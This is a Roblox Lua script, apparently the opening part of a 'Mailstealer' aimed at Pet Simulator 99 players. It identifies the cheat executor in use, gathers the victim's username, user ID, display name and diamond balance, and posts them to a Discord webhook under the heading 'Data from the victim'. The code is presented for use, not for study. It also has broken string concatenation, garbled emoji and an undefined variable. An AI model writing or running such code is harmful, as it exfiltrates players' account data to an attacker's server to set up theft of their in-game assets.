--// Executor detector

local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "Sirhurt") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getscriptenvs and "Calamari") or
		(unit and not syn and "Unit") or
		(OXYGEN_LOADED and "Oxygen U") or
		(IsElectron and "Electron") or
		("Unsupported")

	return exploit
  end

--// Execution Log
if game.PlaceId == 8737899170 then
	_G.GameIn = "Pet Simulator 99"
elseif game.PlaceId == 15502339080 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then

else
	_G.GameIn = "â“ Couldn't find game"
end
local webhookcolor = "13369599"
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats["💎 Diamonds"].Value
local function sendwebhook(msg)
local msg = {
	["content"]= "**custumz on top ngl**",
	["embeds"]= {
	  {
		["title"]= "`custumz Mailstealer Results`",
		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.. "\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **""**\nâ˜ Executor: **"..getexploit().."**",
		["url"]= "https://discord.gg/VZX6jGKgxw",
		["color"]= ""..webhookcolor.."",
  }
  },
	["attachments"] = {}
  }
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
